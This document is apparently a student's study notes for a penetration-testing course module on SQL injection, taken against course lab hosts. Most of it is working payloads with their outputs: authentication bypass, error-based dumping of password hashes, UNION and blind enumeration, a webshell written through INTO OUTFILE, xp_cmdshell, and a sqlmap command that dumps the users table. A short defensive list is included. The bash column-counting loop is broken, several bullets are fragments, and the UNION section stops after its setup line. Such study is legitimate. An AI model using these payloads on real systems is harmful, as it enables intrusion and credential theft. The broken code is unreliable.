    <h2>TLDR;</h2>
<p>This module escalates quickly from theory to exploitation. The detailed lab entries emphasize mapping the query, tuning payloads, and documenting impact. Here’s the enriched playbook.</p>
<h3>Recon the Query Structure</h3>
<ol>
<li>Record endpoint, parameter, and HTTP method.</li>
<li>Probe with safe payloads:<ul>
<li><code>&#39; OR 1=1--</code></li>
<li>`&quot; OR &quot;1&quot;=&quot;1&quot;.</li>
<li><code>&#39;) ORDER BY 5--</code></li>
</ul>
</li>
<li>Watch for error messages (syntax, type mismatch, database banners). Capture screenshots.</li>
</ol>
<pre><code># Column count discovery
tor=&#39;1 ORDER BY 1-- -&#39;
for i in $(seq 1 10); do
  curl -s &quot;https://portal.acme.local/product.php?id=${tor//$i/&quot;$i&quot;}&quot; | grep -q &quot;Server Error&quot; &amp;&amp; echo &quot;Columns &gt;= $i&quot;;
done
</code></pre>
<h3>Enumerate with UNION</h3>
<ul>
<li>Find the number of columns using <code>ORDER BY n</code> or <code>UNION SELECT NULL,...</code> until the app stops erroring.</li>
<li>Replace <code>NULL</code> with diagnostics: <code>@@version</code>, <code>database()</code>, <code>user()</code>, <code>table_name</code> from <code>information_schema.tables</code>.</li>
</ul>
<pre><code>&#39; UNION SELECT 1,2,3,@@version,5,6-- -
&#39; UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
</code></pre>
<h3>Blind Techniques</h3>
<ul>
<li>Boolean: <code>AND &#39;a&#39;=&#39;a&#39;</code>, <code>AND (SELECT COUNT(*) FROM users) &gt; 0</code>.</li>
<li>Time-based: <code>AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)</code>.</li>
<li>Content-diff: measure response length differences.</li>
</ul>
<p>Log payloads and timing deltas; they evidence impact even without visible output.</p>
<h3>Data Exfiltration &amp; Code Exec</h3>
<ul>
<li><strong>MySQL:</strong> <code>SELECT &#39;&lt;php code&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;</code> (if file perms allow).</li>
<li><strong>SQL Server:</strong> enable <code>xp_cmdshell</code> and launch PowerShell payloads.</li>
<li><strong>PostgreSQL:</strong> <code>COPY (SELECT * FROM users) TO &#39;/tmp/users.csv&#39; WITH CSV</code>.</li>
</ul>
<p>Capture resulting shells or downloaded files as proof.</p>
<h3>Automation Helpers</h3>
<p>Manual exploitation teaches you the structure; once mapped, pivot to <code>sqlmap</code> for breadth.</p>
<pre><code class="language-bash">sqlmap -u &quot;https://portal.acme.local/product.php?id=1&quot; --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
</code></pre>
<p>Store <code>sqlmap</code> audit logs and sanitized dumps; they belong in the technical appendix.</p>
<h3>Defensive Guidance</h3>
<ul>
<li>Enforce prepared statements / parameterized queries.</li>
<li>Operate databases under least-privileged accounts.</li>
<li>Sanitize output to avoid leaking stack traces.</li>
<li>Monitor for anomalous query patterns (long running times, UNION bursts, failed logins).</li>
</ul>
<p>Module 10 rewards patience. Map the query by hand, record every payload, and automate only after you understand the data flow.</p>

<h6>SQL Theory Refresher</h6>
<p>Structured Query Language (SQL) has been developed specifically to manage and interact with data stored inside <a href="https://en.wikipedia.org/wiki/Relational_database">relational databases</a>.</p>
<p><strong>Example:</strong> parse user table and retrieve a specified user entry.</p>
<pre><code>SELECT * FROM users WHERE user_name=&#39;noel&#39;
</code></pre>
<p>Web apps automate functionality by embedding SQL queries in their source code, see the PHP example;</p>
<pre><code>&lt;?php
$uname = $_POST[&#39;uname&#39;];
$passwd =$_POST[&#39;password&#39;];

$sql_query = &quot;SELECT * FROM users WHERE user_name= &#39;$uname&#39; AND password=&#39;$passwd&#39;&quot;;
$result = mysqli_query($con, $sql_query);
?&gt;
</code></pre>
<p><em>Please note that the i inside the mysqli_query PHP function stands for improved and should not be confused with the vulnerability (as the i in SQLi stands for injection).</em></p>
<p>In order to search the database, the SQL server runs the query SELECT * FROM users WHERE user_name= noel. If, instead, the user enters &quot;noel &#39;+!@#$&quot;, the SQL server will run the query SELECT * FROM users WHERE user_name= noel&#39;+!@#$. Nothing in our code block checks for these special characters, and it&#39;s this lack of filtering that causes the vulnerability.</p>

<h5>10.2 SQL Theory and Databases</h5>
<ul>
<li>Manually identify SQL injection vulnerabilities.</li>
<li>Understand UNION SQLi payloads.</li>
<li>Learn about Error SQLi payloads.</li>
<li>Understand Blind SQLi payloads.</li>
</ul>
<h6>Identifying SQLi via Error-based Payloads</h6>
<pre><code>&lt;?php
$uname = $_POST[&#39;uname&#39;];
$passwd =$_POST[&#39;password&#39;];

$sql_query = &quot;SELECT * FROM users WHERE user_name= &#39;$uname&#39; AND password=&#39;$passwd&#39;&quot;;
$result = mysqli_query($con, $sql_query);
?&gt;
</code></pre>
<ul>
<li>In the PHP snipped above.</li>
<li><code>uname</code> and <code>password</code> are user-supplied.</li>
<li>This means we can control the <code>$sql_query</code> variable.</li>
<li>Allows us to craft a new query!</li>
<li>In some cases SQLi can lead to auth bypass, the first vector we will explore.</li>
<li>By forcing the closing quote on <code>uname</code> and adding <code>OR 1=1</code> followed by a <code>--</code> comment seperator and <code>//</code> we can prematurely terminate the SQL statement.<ul>
<li>The syntax for this type of comment requires <code>//</code> followed by <code> </code> whitespace char.</li>
</ul>
</li>
<li>Trailing the comments with <code>//</code> provides.</li>
<li>Visibility on payload.</li>
<li>Some protection agains whitespace truncation employed by web app.</li>
</ul>
<pre><code>offsec&#39; OR 1=1 -- //
</code></pre>
<p>As a result, forwarde to SQL server;</p>
<pre><code>SELECT * FROM users WHERE user_name= &#39;offsec&#39; OR 1=1 --
</code></pre>
<ul>
<li>The appended OR statement will always be true.</li>
<li>The WHERE clause will return the first user ID present in DB.</li>
<li>Whether or not the record is present.</li>
<li>Because no other checks are implemented by app, we gain admin privs by circumventing auth logic!</li>
</ul>
<p><strong>Offsec - SQLi  Playground</strong></p>
<ul>
<li>Enter user <code>offsec</code> password <code>jam</code></li>
<li>Invalid password message returned.</li>
<li>Insert special char <code>&#39;</code> and try again.<ul>
<li>Error returned!</li>
</ul>
</li>
</ul>
<pre><code>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;5275cb415e5bc3948e8f2cd492859f26&#39;&#39; at line 1
</code></pre>
<p><em>SQL injection is considered in-band when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we&#39;ve enabled SQL debugging inside the web application; however, most production-level web applications won&#39;t show these error messages because revealing SQL debugging information is considered a security flaw.</em></p>
<ul>
<li>Given above result, try the auth bypass payload <code>offsec&#39; OR 1=1 -- //</code></li>
<li><strong>Authentication Successfull!!!</strong>.</li>
<li>We can also inject an arbitrary second statement.</li>
</ul>
<pre><code>&#39; or 1=1 in (select @@version) -- //
</code></pre>
<ul>
<li>Version returned in Error!</li>
</ul>
<pre><code>Warning: 1292: Truncated incorrect DOUBLE value: &#39;8.0.28&#39;

Authentication Successfull
</code></pre>
<p><em>MySQL accepts both version() and @@version statements.</em></p>
<ul>
<li>We are able to query the DB interactively, as if we were at an admin terminal.</li>
<li>We can try to dump all of the data in the user tables;</li>
</ul>
<pre><code>&#39; OR 1=1 in (SELECT * FROM users) -- //
</code></pre>
<ul>
<li>We return an error, telling us to query only one column at a time.</li>
</ul>
<pre><code>Error: Operand should contain 1 column(s)
</code></pre>
<ul>
<li>We will grab the passoword col.</li>
</ul>
<pre><code>&#39; or 1=1 in (SELECT password FROM users) -- //
</code></pre>
<ul>
<li>Returns, what appear to be MD5 password hashes;</li>
</ul>
<pre><code>Warning: 1292: Truncated incorrect DOUBLE value: &#39;21232f297a57a5a743894a0e4a801fc3&#39; Warning: 1292: Truncated incorrect DOUBLE value: &#39;f9664ea1803311b35f81d07d8c9e072d&#39; Warning: 1292: Truncated incorrect DOUBLE value: &#39;5f4dcc3b5aa765d61d8327deb882cf99&#39; Warning: 1292: Truncated incorrect DOUBLE value: &#39;5653c6b1f51852a6351ec69c8452abc6&#39;

Invalid password!
</code></pre>
<ul>
<li>We don&#39;t know which hash corresponds to which user, we can retrieve admin directly;</li>
</ul>
<pre><code>&#39; or 1=1 in (SELECT password FROM users WHERE username = &#39;admin&#39;) -- //
</code></pre>
<ul>
<li>The admin user MD5 has returns;</li>
</ul>
<pre><code>Warning: 1292: Truncated incorrect DOUBLE value: &#39;21232f297a57a5a743894a0e4a801fc3&#39;

Invalid password!
</code></pre>
<p><strong>We have predictably fetched table data with the Error-Based SQLi vuln we discovered!</strong></p>
<h6>UNION-based Payloads</h6>
<ul>
<li>When dealing with in-band SQLi and the result of the query is returned along with the application-returned value;<ul>
<li>Test for UNION-BASED SQL Injection next!!!</li>
</ul>
</li>
<li><a href="https://www.w3schools.com/sql/sql_union.asp">UNION</a> keyword.</li>
<li>Enables an extra select statement in a single query.</li>
<li>Providing both results.</li>
<li>Concat both query into one statement.</li>
</ul>
<p>UNION SQLi requires two conditions to be true;</p>
<ul>
<li>The injected UNION has the same number of cols as the original query.</li>
<li>Data types of the cols must be compatible.</li>
</ul>
<p>To demonstrate;</p>
<pre><code>$query = &quot;SELECT * from customers WHERE name LIKE &#39;&quot;.$_POST[&quot;search_input&quot;].&quot;%&#39;&quot;;
</code></pre>

<h6>Blind SQL Injections</h6>
<p>The SQLi payloads we have worked with so far are &quot;in-band&quot;, meaning we retrieve the content of our query inside the web app.</p>
<p>Blind SQLi is a case where responses are never returned.  Response is inferred using;</p>
<ul>
<li>Boolean.</li>
<li>Time-based logic.</li>
</ul>
<p>Boolean-based blind SQL injection causes the app to return different predictible values whenever the DB returns TRUE or FALSE.
<em>Although &quot;boolean-based&quot; might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.</em></p>
<p>Time-based blind SQLi infer the query result by instructing the DB to wait for a specified amount of time.  Based on response time, we can conclude if the statement is TRUE or FALSE.</p>
<p>Log into blind SQLi test page and notice that the URL takes a <code>user</code> param;</p>
<pre><code>http://192.168.202.16/blindsqli.php?user=offsec
</code></pre>
<ul>
<li>This value defaults to the logged in user, offsec.</li>
<li>App prints the user record;</li>
<li>Username.</li>
<li>Password MD5 hash.</li>
<li>Description.</li>
<li>To test for boolean-based SQLi we can append the following payload;</li>
</ul>
<pre><code>http://192.168.50.16/blindsqli.php?user=offsec&#39; AND 1=1 -- //
</code></pre>
<ul>
<li>Since 1=1 is TRUE the app will return values only if the user is present in the DB.</li>
<li>Using this syntax you could enumerate the entire DB.</li>
<li>With time based payload;</li>
</ul>
<pre><code>http://192.168.50.16/blindsqli.php?user=offsec&#39; AND IF (1=1, sleep(3),&#39;false&#39;) -- //
</code></pre>
<ul>
<li>Note app hangs for 3 seconds before returning.</li>
<li>TRUE.</li>
<li>Returns immediately.</li>
<li>FALSE.
<em>This type of attack is time consuming and should be automated through tools like SQLmap</em></li>
</ul>
